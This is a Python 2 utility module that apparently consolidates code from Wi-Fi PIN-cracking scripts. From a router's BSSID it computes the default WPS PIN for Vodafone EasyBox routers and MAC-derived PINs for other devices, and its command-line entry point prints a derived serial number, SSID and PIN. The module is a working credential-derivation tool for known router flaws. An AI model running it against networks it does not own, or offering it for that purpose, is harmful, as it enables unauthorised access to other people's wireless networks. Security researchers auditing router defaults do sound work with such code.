#!/usr/bin/env python
"""WPS PIN checksum and generation utilities.

Consolidates the WPS PIN checksum algorithm previously duplicated across
wpspin.py, belkin-wpspin.py, easybox_wps.py, and Default-wps-pin/default-wps-pin.py.
"""

import re
import sys


def wps_pin_checksum(pin):
    """Compute the WPS PIN checksum digit (Luhn-like, per WCN-Netspec).

    Args:
        pin: 7-digit integer PIN (without checksum digit).

    Returns:
        int: single checksum digit (0-9).
    """
    accum = 0
    while pin:
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return (10 - accum % 10) % 10


def pin_from_mac_hex(mac_hex_last6):
    """Derive a WPS PIN from the last 6 hex digits of a MAC address.

    Used by wpspin.py and belkin-wpspin.py.

    Args:
        mac_hex_last6: 6-character hex string (e.g. last 3 octets of BSSID).

    Returns:
        str: 8-digit WPS PIN including checksum digit.
    """
    p = int(mac_hex_last6, 16) % 10000000
    return "%07d%d" % (p, wps_pin_checksum(p))


def gen_easybox_pin(mac_str, sn):
    """Generate the default WPS PIN for Vodafone EasyBox routers.

    Consolidates the identical gen_pin() from easybox_wps.py and
    Default-wps-pin/default-wps-pin.py.

    Args:
        mac_str: 12-character hex string of the full MAC address (no separators).
        sn: serial number string (e.g. 'R----01234').

    Returns:
        str: 8-digit WPS PIN including checksum digit.
    """
    mac_int = [int(x, 16) for x in mac_str]
    sn_int = [0] * 5 + [int(x) for x in sn[5:]]
    hpin = [0] * 7

    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9]
    hpin[1] = k1 ^ sn_int[8]
    hpin[2] = k2 ^ mac_int[9]
    hpin[3] = k2 ^ mac_int[10]
    hpin[4] = mac_int[10] ^ sn_int[9]
    hpin[5] = mac_int[11] ^ sn_int[8]
    hpin[6] = k1 ^ sn_int[7]
    pin = int('%1X%1X%1X%1X%1X%1X%1X' % (
        hpin[0], hpin[1], hpin[2], hpin[3],
        hpin[4], hpin[5], hpin[6]), 16) % 10000000

    return '%i%i' % (pin, wps_pin_checksum(pin))


def easybox_main():
    """CLI entry point for EasyBox WPS PIN generation (shared by both scripts)."""
    if len(sys.argv) != 2:
        sys.exit('usage: easybox_wps.py [BSSID]\n eg. easybox_wps.py 38:22:9D:11:22:33\n')

    mac_str = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
    if len(mac_str) != 12:
        sys.exit('check MAC format!\n')

    sn = 'R----%05i' % int(mac_str[8:12], 16)
    print 'derived serial number:', sn
    print 'SSID: Arcor|EasyBox|Vodafone-%c%c%c%c%c%c' % (
        mac_str[6], mac_str[7], mac_str[8], mac_str[9], sn[5], sn[9])
    print 'WPS pin:', gen_easybox_pin(mac_str, sn)
